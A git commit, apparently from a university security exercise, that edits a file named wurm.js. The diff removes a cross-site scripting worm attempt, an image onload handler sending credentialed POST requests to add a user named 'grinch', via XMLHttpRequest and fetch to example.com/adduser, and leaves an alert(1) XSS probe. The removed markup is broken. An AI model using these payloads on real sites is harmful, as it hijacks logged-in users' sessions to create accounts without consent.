5385eee0122a7065e416ccacb1f46a9186df1fce
Marcel Pfefferle <marcel.pfefferle@rub.de>
2018-07-14 20:35:35 +0200

    not working too

--- wurm.js
+++ wurm.js
@@ -1,16 +1,1 @@
-<script src="https://code.jquery.com/jquery-2.2.0.js"><\/script>
-<script>$(document.body).append("<p>jQuery is loaded.</p>")<\/script>
-<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="
-var x = new XMLHttpRequest();
-x.open('post', '');
-x.withCredentials = true;
-x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-x.send('user=grinch');
-</script>
-<script>
-var form = new FormData();
-form.append('user', 'grinch');
-fetch('http://example.com/adduser',
-    {method:"POST", body:form, credentials:'include'}
-);
-">
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="alert(1)">
